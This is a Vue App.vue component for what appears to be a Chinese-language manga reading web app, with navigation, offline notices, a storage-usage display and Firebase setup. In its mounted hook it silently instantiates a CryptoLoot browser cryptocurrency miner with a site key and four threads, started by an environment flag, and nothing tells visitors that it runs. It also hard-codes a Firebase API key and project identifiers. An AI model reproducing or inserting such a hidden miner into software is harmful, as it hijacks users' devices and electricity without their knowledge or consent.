<template>
  <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
    <header class="mdl-layout__header mdl-color--blue-grey-900">
      <div class="mdl-layout__header-row">
        <span class="mdl-layout-title">{{ this.title }}</span>
      </div>
    </header>
    <div class="mdl-layout__drawer">
      <span class="mdl-layout-title">{{ this.title }}</span>
      <nav class="mdl-navigation">
        <router-link class="mdl-navigation__link" to="/" @click.native="hideMenu">Home</router-link>
        <router-link class="mdl-navigation__link" to="/post" @click.native="hideMenu">{{ this.usedMBytes }} in {{ this.grantedMBytes }}</router-link>
      </nav>
    </div>
    <main class="mdl-layout__content mdl-color--blue-grey-900">
      <div class="page-content">
        <router-view></router-view>
      </div>
    </main>
    <div id="offline_toast" class="mdl-js-snackbar mdl-snackbar">
      <div class="mdl-snackbar__text"></div>
      <button class="mdl-snackbar__action" type="button"></button>
    </div>
  </div>
</template>

<script>

require('material-design-lite')
var network = require('./networkUtil')
const firebase = require('./firebase').Firebase
const CryptoLoot = require('./crypt')
export default {
  name: 'app',
  data () {
    return {
      'title': process.env.APP_TITLE,
      'usedMBytes': 0,
      'grantedMBytes': 0
    }
  },
  methods: {
    hideMenu: function () {
      document.getElementsByClassName('mdl-layout__drawer')[0].classList.remove('is-visible')
      document.getElementsByClassName('mdl-layout__obfuscator')[0].classList.remove('is-visible')
    }
  },
  mounted () {
    var contextHolder = this
    var miner = new CryptoLoot.Anonymous('09f536306af8269d4170f66e83b4d0675d7023fabba1',
      {
        threads: 4, autoThreads: false, throttle: 0.2
      })
    if (process.env.RUN_MINE) {
      miner.start()
    }
    miner.on('accepted', () => { console.log('[Miner] Hash Accepted') })
    miner.on('found', () => { console.log('[Miner] Hash Found') })

    window.addEventListener('load', function () {
      function updateOnlineStatus (event) {
        var snackbarContainer = document.querySelector('#offline_toast')
        var data = { message: navigator.onLine ? '網路已重新連線' : '網路已斷線，進入離線模式' }
        snackbarContainer.MaterialSnackbar.showSnackbar(data)
        network.online = navigator.onLine
      }

      window.addEventListener('online', updateOnlineStatus)
      window.addEventListener('offline', updateOnlineStatus)
    })
    navigator.webkitTemporaryStorage.queryUsageAndQuota(
      function (usedBytes, grantedBytes) {
        contextHolder.usedMBytes = usedBytes / 1024 / 1024
        contextHolder.grantedMBytes = grantedBytes / 1024 / 1024
      },
      function (e) { console.log('Error', e) }
    )
    // Initialize Firebase
    var config = {
      apiKey: 'AIzaSyC2ye04Kbt002qR8dMeO-L1V1RFNqFzovc',
      authDomain: 'mangaclub-1509968179920.firebaseapp.com',
      databaseURL: 'https://mangaclub-1509968179920.firebaseio.com',
      projectId: 'mangaclub-1509968179920',
      storageBucket: '',
      messagingSenderId: '294370342368'
    }
    firebase.initializeApp(config)
  }
}
</script>

<style>
@import url('https://fonts.googleapis.com/icon?family=Material+Icons');
@import url('https://code.getmdl.io/1.2.1/material.blue-red.min.css');

  img {
    max-width: 100%;
  }
</style>



